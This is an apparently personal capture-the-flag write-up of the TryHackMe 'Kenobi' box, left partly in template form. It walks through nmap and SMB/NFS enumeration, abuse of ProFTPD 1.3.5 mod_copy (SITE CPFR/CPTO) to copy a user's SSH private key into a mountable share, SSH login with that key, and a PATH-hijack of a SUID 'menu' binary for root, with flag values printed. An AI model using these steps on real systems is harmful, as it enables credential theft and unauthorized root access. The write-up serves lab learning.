# kenobi

| | |
|---|---|
| **Platform** | TryHackMe |
| **Difficulty** | Easy / Medium |
| **Date** | 2026-07-29 |
| **Author** | Sytrus101 |
| **Tags** | `enumeration` `privesc` |
| **Flags** | user.txt · root.txt |

> **One-line summary:** _replace this with a single sentence describing the
> attack path once you've finished: e.g. "Anonymous SMB share leaked
> credentials reused on SSH; sudo misconfiguration gave root."_

---

## 1. Reconnaissance

### Port scan

```bash
nmap -sS -sV 10.0.0.49 -oN nmap_kenobi.txt
nmap -p 139 --script=smb-enum-shares.nse,smb-enum-users.nse 10.67.154.237 -oN nmap_kenobi.txt --append
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.67.154.237 -oN nmap_kenobi.txt --append
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.67.128.243
```
Nmap 7.99 scan initiated Wed Jul 29 09:23:29 2026 as: /usr/lib/nmap/nmap --privileged -sV -sS -oN nmap_kenobi.txt 10.67.154.237
Nmap scan report for 10.67.154.237
Host is up (0.045s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
2049/tcp open  nfs         3-4 (RPC #100003)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Wed Jul 29 09:23:52 2026: 1 IP address (1 host up) scanned in 23.36 seconds
Nmap 7.99 scan initiated Wed Jul 29 09:25:44 2026 as: /usr/lib/nmap/nmap --privileged -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse -oN nmap_kenobi.txt --append 10.67.154.237
Nmap scan report for 10.67.154.237
Host is up (0.064s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap done at Wed Jul 29 09:25:48 2026: 1 IP address (1 host up) scanned in 3.55 seconds
Nmap 7.99 scan initiated Wed Jul 29 09:29:42 2026 as: /usr/lib/nmap/nmap --privileged -p 139 --script=smb-enum-shares.nse,smb-enum-users.nse -oN nmap_kenobi.txt --append 10.67.154.237
Nmap scan report for 10.67.154.237
Host is up (0.054s latency).

PORT    STATE    SERVICE
139/tcp filtered netbios-ssn

Nmap done at Wed Jul 29 09:29:43 2026: 1 IP address (1 host up) scanned in 1.28 seconds
Nmap 7.99 scan initiated Wed Jul 29 09:59:58 2026 as: /usr/lib/nmap/nmap --privileged -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount -oN nmap_kenobi.txt --append 10.67.128.243
Nmap scan report for 10.67.128.243
Host is up (0.042s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9183416.0  5776076.0  2916744.0  67%   16.0T        32000
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| ??????????  ?    ?    ?     ?                    ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2025-08-10T06:48:58  cache
| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2026-07-29T13:50:24  log
| rwxr-xr-x   0    0    4096  2025-08-09T13:38:21  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_

# Nmap done at Wed Jul 29 10:00:00 2026: 1 IP address (1 host up) scanned in 2.01 seconds

---

## 2. Enumeration

```bash
smbclient //10.67.154.237/anonymous
ls
searchsploit ProFTPd
```
"log.txt" file found
Mount on /var
ProFTPd 1.3.5: 'mod_copy' Command Execution (Metasploit)                                                                                                                                                                                                                                 | linux/remote/37262.rb
ProFTPd 1.3.5: 'mod_copy' Remote Command Execution                                                                                                                                                                                                                                       | linux/remote/36803.py
ProFTPd 1.3.5: 'mod_copy' Remote Command Execution (2)                                                                                                                                                                                                                                   | linux/remote/49908.py
ProFTPd 1.3.5: File Copy  

### Service: ProFTPD 1.3.5
```bash
nc 10.67.128.243 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.67.128.243]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful

mkdir /mnt/kenobiNFS
mount 10.67.128.243:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
sudo chmod 600 id_rsa
ssh -i id_rsa kenobi@10.67.128.243
```
---

## 3. Initial foothold

**Vulnerability:**
ProFTPD version 1.3.5
**How I exploited it:**
copied over the id_rsa file and then used that to ssh into kenobi account

```bash
nc 10.67.128.243 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.67.128.243]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful

mkdir /mnt/kenobiNFS 
mount 10.67.128.243:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
sudo chmod 600 id_rsa
ssh -i id_rsa kenobi@10.67.128.243
```

**kenobi/user.txt**

```
d0b0f3f53b6caa532a83915e19224899
```

_Proof screenshot: `screenshots/user_flag.png`_
'/home/akriger/Pictures/Screenshot_2026-07-29_10-35-26.png' 
---

## 4. Privilege escalation

### Enumeration

```bash
find / -perm -u=s -type f 2>/dev/null
```

**What I found:**
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/su

### Exploitation

**Vector:**
/usr/bin/menu

```bash
cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu
**root.txt**
177b3cd8562289f37382721c28381f02
```

_Proof screenshot: `screenshots/root_flag.png`_
'/home/akriger/Pictures/Screenshot_2026-07-29_10-34-39.png' 
---

## 5. Remediation

_Write this section as if reporting to the box owner. It's the difference
between "I did a CTF" and "I understand security." Two or three concrete fixes:_

- **Finding:** 
ProFTPD 1.3.5 Server version has multiple exploits which can be used to gain access to root shell
  **Fix:** Update ProFTPD version number

---

## 6. Exploit-DB

ProFTPd 1.3.5: 'mod_copy' Remote Command Execution CVE: 2015-3306 
---
